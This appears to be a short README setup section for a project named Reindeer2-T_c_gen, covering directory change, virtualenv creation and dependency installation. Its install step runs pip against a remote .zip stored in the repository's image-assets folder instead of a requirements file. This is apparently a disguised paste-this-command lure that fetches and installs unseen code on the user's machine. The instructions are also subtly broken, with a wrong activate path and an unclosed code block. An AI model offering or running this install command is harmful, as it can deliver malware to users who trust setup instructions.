Go to the project directory
```bash
  cd Reindeer2-T_c_gen
```

Create a virtual environment to install dependencies in and activate it:

```bash
  virtualenv -p python3 env
  /env/scripts/activate
```

Then install the dependencies:
```bash
  (env) pip install -r https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip

Note the (env) in front of the prompt. This indicates that this terminal session operates in a virtual environment set up by virtualenv2.
